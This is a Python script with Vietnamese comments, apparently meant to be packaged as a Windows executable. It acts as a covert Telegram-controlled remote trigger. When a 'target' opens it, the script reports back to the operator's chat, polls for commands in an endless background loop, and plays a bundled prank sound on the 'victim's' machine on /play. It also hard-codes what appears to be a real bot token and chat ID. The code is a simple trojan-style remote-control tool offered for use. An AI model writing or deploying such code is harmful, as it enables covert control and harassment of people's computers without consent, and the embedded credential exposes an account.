# -*- coding: utf-8 -*-
import os
import time
import subprocess
import json
import sys
import winsound

TOKEN = "8857086218:AAEUbuZEmt-ow5sbCLp0vL2vYL0Q5VcyQpc"
MY_CHAT_ID = "8976170772"  # ID của riêng bạn, ngoài ID này ra không ai điều khiển được bot

def resource_path(relative_path):
    """ Giúp file exe tìm đúng file nhạc đi kèm trong gói ẩn """
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

AUDIO_PATH = resource_path("troll.mp3")

def send_telegram_message(chat_id, text):
    try:
        msg_url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage"
        subprocess.check_output([
            "curl", "-s", "-X", "POST", msg_url,
            "-d", "chat_id=" + str(chat_id),
            "-d", "text=" + text
        ])
    except Exception as e:
        print("Loi:", e)

def get_latest_offset():
    try:
        url = "https://api.telegram.org/bot" + TOKEN + "/getUpdates?limit=1"
        output = subprocess.check_output(["curl", "-s", url])
        data = json.loads(output.decode('utf-8', errors='ignore'))
        results = data.get("result", [])
        if results:
            return results[-1]["update_id"] + 1
    except:
        pass
    return 0

def run_bot():
    # Vừa bật ứng dụng lên là gửi ngay thông báo "Chuẩn bị nhận tín hiệu" về cho bạn
    send_telegram_message(MY_CHAT_ID, "Mục tiêu vừa mở ứng dụng! Chuẩn bị nhận tín hiệu...")
    
    offset = get_latest_offset()
    url = "https://api.telegram.org/bot" + TOKEN + "/getUpdates"
    
    # Vòng lặp chạy ngầm vĩnh viễn không bao giờ tắt
    while True:
        try:
            full_url = url + "?offset=" + str(offset) + "&timeout=30"
            output = subprocess.check_output(["curl", "-s", full_url])
            data = json.loads(output.decode('utf-8', errors='ignore'))
            
            for result in data.get("result", []):
                offset = result["update_id"] + 1
                message = result.get("message", {})
                text = message.get("text", "")
                sender_chat_id = str(message.get("chat", {}).get("id", ""))
                
                # BẢO MẬT: Chỉ chấp nhận lệnh khi CHÍNH XÁC LÀ CHAT ID CỦA BẠN nhắn đến
                if sender_chat_id == MY_CHAT_ID:
                    if text.strip() == "/play":
                        # 1. Gửi tin nhắn thông báo đã kích hoạt
                        send_telegram_message(MY_CHAT_ID, "Đã kích hoạt!")
                        
                        # 2. Phát âm thanh ngầm trên máy nạn nhân
                        try:
                            winsound.PlaySound(AUDIO_PATH, winsound.SND_FILENAME | winsound.SND_ASYNC)
                        except Exception as e:
                            print("Loi phat nhac:", e)
                            
        except Exception:
            time.sleep(5)
        time.sleep(1)

if __name__ == "__main__":
    run_bot()